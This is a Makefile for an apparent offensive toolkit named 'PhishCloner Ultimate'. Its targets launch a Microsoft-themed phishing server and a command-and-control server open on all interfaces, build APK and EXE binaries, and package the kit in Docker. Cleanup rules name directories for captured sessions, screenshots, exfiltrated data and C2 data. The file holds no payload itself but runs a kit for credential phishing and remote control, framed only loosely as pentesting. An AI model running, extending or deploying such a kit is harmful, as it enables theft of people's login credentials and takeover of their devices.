PYTHON ?= python3
PIP ?= pip3
DOCKER ?= docker
COMPOSE ?= docker-compose

.PHONY: help install test serve c2 report clean build docker docker-up docker-down apks

help:
	@echo "╔══════════════════════════════════════════╗"
	@echo "║  PhishCloner Ultimate v1.0.0             ║"
	@echo "║  Signé Ghost1o1                          ║"
	@echo "╚══════════════════════════════════════════╝"
	@echo ""
	@echo "  install      Install Python deps"
	@echo "  test         Run test suite"
	@echo "  serve        Start phish server (port 8443)"
	@echo "  c2           Start C2 server (port 5000)"
	@echo "  report       Generate pentest PDF report"
	@echo "  build        Build APK + EXE"
	@echo "  docker       Build Docker image"
	@echo "  docker-up    Run docker-compose up"
	@echo "  docker-down  Run docker-compose down"
	@echo "  clean        Remove caches + build artifacts"
	@echo "  fclean       Full clean (incl. certs + sessions)"

install:
	@bash setup.sh

test:
	@$(PYTHON) -m pytest tests/ -v --tb=short || echo "Tests not configured"

serve:
	@$(PYTHON) phishcloner.py serve --template microsoft --port 8443

c2:
	@$(PYTHON) c2/server.py --bind 0.0.0.0 --port 5000

report:
	@$(PYTHON) phishcloner.py report --session latest --format pdf

build:
	@bash android/build.sh
	@$(PYTHON) build/build_exe.py

docker:
	@$(DOCKER) build -t ghost1o1/phishcloner-ultimate:1.0.0 .

docker-up:
	@$(COMPOSE) up -d

docker-down:
	@$(COMPOSE) down

clean:
	@find . -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null || true
	@find . -type d -name ".pytest_cache" -exec rm -rf {} + 2>/dev/null || true
	@rm -rf build/ dist/ *.egg-info/

fclean: clean
	@rm -rf certs/ phish_sessions/* phish_screenshots/* phish_exfil/* c2_data/* logs/*
	@echo "Full clean done."
